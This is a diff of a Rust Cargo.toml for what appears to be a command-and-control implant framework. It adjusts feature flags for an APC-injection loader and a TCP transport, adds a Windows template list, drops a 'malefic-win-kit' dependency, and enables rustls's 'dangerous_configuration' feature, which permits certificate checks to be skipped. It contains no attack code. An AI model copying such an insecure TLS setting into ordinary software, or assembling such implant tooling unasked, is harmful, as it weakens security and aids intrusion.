@@ -62,10 +62,13 @@ Linux = []
 Unix = []
 
 default = [
-        "Common_Transport_Tcp",
         "Win",
-        "Loader_Mei_Apc", "professional"]
+        "Loader_Mei_Apc", "Common_Transport_Tcp", "community"]
 
+win_template = [
+        "Loader_Mei_Apc",
+        "Win",
+]
 community = []
 professional = []
 
@@ -86,7 +89,7 @@ digest = "0.10"
 prost = "0.13.1"
 detour = { git = "https://github.com/Hpmason/detour-rs", branch = "fix-nightly1.67.0-changes" }
 # async-tls = "0.13"
-rustls = "0.20.6"
+rustls = { version =  "0.20.6", features = ["dangerous_configuration"] }
 rustls-pemfile = "1.0"
 # syscalls = "0.6.15"
 [dependencies.async-std]
@@ -116,7 +119,6 @@ windows-sys = { version = "0.52.0", features = [
         "Win32_System_Registry",
         "Win32_System_LibraryLoader",
 ]}
-malefic-win-kit = { path = "../malefic-win-kit" }
 
 [target.'cfg(unix)'.dependencies]
 libc = "0.2"
